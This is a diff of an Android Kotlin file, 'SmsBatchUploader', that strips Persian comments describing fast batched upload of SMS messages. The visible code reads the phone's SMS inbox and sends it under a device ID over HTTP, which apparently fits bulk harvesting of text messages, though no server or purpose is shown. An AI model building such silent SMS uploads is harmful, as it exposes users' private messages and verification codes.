@@ -9,17 +9,7 @@ import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 
-/**
- * 🚀 سیستم آپلود حرفه‌ای SMS با Batch + Chunk Processing
- *
- * ویژگی‌ها:
- * - سریع و بهینه (دقیقاً مثل Flutter)
- * - پردازش Batch به Batch (200 تایی)
- * - Chunk Processing (2000 تایی)
- * - Retry Mechanism (3 بار تلاش)
- * - Memory Management (جلوگیری از crash)
- * - Progress Tracking
- */
+
 object SmsBatchUploader {
 
     private const val TAG = "SmsBatchUploader"
@@ -37,9 +27,7 @@ object SmsBatchUploader {
     private var isCancelled = false
     private var isUploading = false
 
-    /**
-     * 📤 آپلود سریع اولیه - فقط 50 تا SMS (مثل Flutter)
-     */
+
     suspend fun uploadQuickSms(
         context: Context,
         deviceId: String,
@@ -51,7 +39,7 @@ object SmsBatchUploader {
 
             val messages = mutableListOf<SmsModel>()
 
-            // خواندن Inbox
+
             val inboxMessages = fetchSmsFromBox(
                 context = context,
                 box = Telephony.Sms.Inbox.CONTENT_URI,
